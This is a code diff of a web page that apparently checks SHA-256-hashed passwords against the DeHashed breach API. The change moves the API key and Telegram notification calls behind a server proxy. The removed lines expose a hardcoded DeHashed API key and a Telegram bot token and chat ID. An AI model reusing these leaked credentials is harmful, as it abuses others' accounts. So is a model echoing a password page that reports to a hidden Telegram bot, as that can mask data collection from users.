@@ -704,26 +704,20 @@
             return hashHex;
         }
 
-        // API configuration
-        const API_KEY = 'zxC/9ZeagjtlqZS3h1ZNLk4mFnIaqMLEZM7Pa1+apqKuUUAN9nCM1Mg=';
-        const API_URL = 'https://api.dehashed.com/v2/search-password';
-        
-        // Telegram notification configuration
-        const BOT_TOKEN = "8098501021:AAGbAdK3olQzWW4iqHsdB26ps8lAaQDFXNg";
-        const CHAT_ID = "7233135247";
+        // API configuration - now using Vercel proxy
+        const API_URL = '/api/proxy';
 
-        // Function to send Telegram notification
+        // Function to send Telegram notification via Vercel API
         async function sendTelegramNotification(message) {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(API_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
+                        action: 'sendTelegram',
+                        data: { message }
                     })
                 });
                 
@@ -863,15 +857,17 @@
                 // Hash the password client-side
                 const hashedPassword = await sha256(password);
                 
-                // Make API request
+                // Make API request via Vercel proxy
                 const response = await fetch(API_URL, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
-                        'DeHashed-Api-Key': API_KEY
+                        'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        sha256_hashed_password: hashedPassword
+                        action: 'checkPassword',
+                        data: {
+                            sha256_hashed_password: hashedPassword
+                        }
                     })
                 });
 
